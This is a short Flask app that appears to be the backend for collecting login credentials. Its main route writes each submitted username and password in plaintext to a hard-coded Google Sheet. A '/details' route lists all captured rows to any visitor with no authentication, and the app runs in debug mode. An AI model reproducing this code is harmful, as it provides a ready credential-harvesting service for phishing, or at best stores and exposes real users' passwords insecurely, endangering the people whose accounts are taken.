from flask import Flask, request, redirect, url_for, render_template
import gspread
from oauth2client.service_account import ServiceAccountCredentials
import json

app = Flask(__name__)

# Load credentials from JSON key file
with open('Google-Credential.json', 'r') as f:
    credentials_json = json.load(f)

# Set up credentials and scope for Google Sheets API
scope = ['https://spreadsheets.google.com/feeds']
credentials = ServiceAccountCredentials.from_json_keyfile_dict(credentials_json, scope)

# Create a client instance for Google Sheets API
client = gspread.authorize(credentials)

# Open the spreadsheet by its ID
spreadsheet_id = '1z8NvgPlAcvr9olTV9a80vGFRci4A_t3oin_POQk7MVo'
sheet = client.open_by_key(spreadsheet_id).sheet1

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        sheet.append_row([username, password])
        return redirect(url_for('index'))
    return render_template('index.html')

@app.route('/details',methods=['GET','POST'])
def details():
    if request.method == 'GET':
        formValue = sheet.get_all_values()
        print(formValue)
        return render_template('details.html',formValue=formValue)
    
    return "<h1>Get Method Not Working<h1>"

@app.route('/file',methods=['GET','POST'])
def file():
    return 'file'

if __name__ == '__main__':
    app.run(debug=True)